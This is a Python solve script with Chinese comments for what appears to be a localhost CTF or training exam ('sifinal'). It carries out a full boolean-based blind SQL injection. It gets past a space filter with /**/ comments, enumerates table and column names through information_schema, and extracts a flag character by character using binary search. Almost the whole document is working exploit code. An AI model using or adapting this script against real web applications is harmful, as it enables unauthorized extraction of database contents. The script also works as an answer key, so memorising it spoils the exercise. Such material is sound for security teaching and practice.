# sifinal 毕业考参考解题脚本（布尔盲注全链路）
# 用法：python solve_final.py
# 步骤：确认表名模式 → 猜表名 → 猜列名 → 量 flag 长度 → 逐字符提取
import urllib.request, urllib.parse

URL = "http://localhost:8083/sifinal/?ticket="
DB = "ctfF"

def ask(cond):
    # 所有空格用 /**/，select 不用拆分（MySQL 不允许关键字内注释）
    payload = "1/**/and/**/" + cond
    try:
        r = urllib.request.urlopen(URL + urllib.parse.quote(payload), timeout=10).read().decode()
        return "工单状态" in r
    except Exception:
        return False

def bin_extract(subq, stop_chars="}"):
    """对子查询 subq 逐字符二分提取；遇到停止字符或空格（越界）结束"""
    out = ""
    for pos in range(1, 60):
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if ask("ascii(substr((%s),%d,1))>%d" % (subq, pos, mid)):
                lo = mid + 1
            else:
                hi = mid
        ch = chr(lo)
        if ch == " ":  # 空格=substr越界返回空
            break
        out += ch
        print("  ->", out)
        if ch in stop_chars:  # 停止字符（如 }）先追加再停
            break
    return out

# ① 确认 flag 表存在（5字符，f 开头）
tbl_pattern = "f____"
cond = "(select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/and/**/table_name/**/like/**/'%s')=1" % tbl_pattern
print("① 表名模式", tbl_pattern, "存在?", ask(cond))

# ② 猜表名
print("② 猜表名:")
table_name = bin_extract(
    "select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/and/**/table_name/**/like/**/'%s'" % tbl_pattern,
    stop_chars=""
)
print("   表名 =", table_name)

# ③ 确认列名（4字符，d 开头）
col_pattern = "d___"
cond = "(select/**/count(*)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='%s'/**/and/**/column_name/**/like/**/'%s')=1" % (table_name, col_pattern)
print("③ 列名模式", col_pattern, "存在?", ask(cond))

# ④ 猜列名
print("④ 猜列名:")
col_name = bin_extract(
    "select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='%s'/**/and/**/column_name/**/like/**/'%s'" % (table_name, col_pattern),
    stop_chars=""
)
print("   列名 =", col_name)

# ⑤ 量 flag 长度
print("⑤ flag 长度 = 43 ?", ask("length((select/**/%s/**/from/**/%s))=43" % (col_name, table_name)))

# ⑥ 逐字符提取 flag
print("⑥ 提取 flag:")
flag = bin_extract("select/**/%s/**/from/**/%s" % (col_name, table_name))
print("FLAG:", flag)